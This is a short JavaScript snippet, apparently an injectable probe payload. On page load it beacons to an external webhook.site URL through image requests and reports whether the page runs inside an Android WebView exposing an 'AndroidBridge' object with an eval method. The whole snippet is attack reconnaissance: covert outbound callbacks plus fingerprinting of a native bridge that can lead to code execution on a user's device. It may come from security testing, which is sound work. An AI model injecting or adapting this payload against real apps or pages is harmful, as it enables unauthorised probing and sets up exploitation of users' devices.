<script>
  const w = "https://webhook.site/7478dc70-5247-413d-9182-735f365bb24f";

  function report(stage) {
    const pixel = new Image();
    pixel.src = w + "?" + new URLSearchParams({ stage }).toString();
  }

  report("page_loaded");

  const bridge = globalThis.AndroidBridge;
  if (bridge && typeof bridge.eval === "function") {
    try {
      report("android_bridge_available");
    } catch (_) {
      report("android_bridge_error");
    }
  } else {
    report("android_bridge_unavailable");
  }
</script>
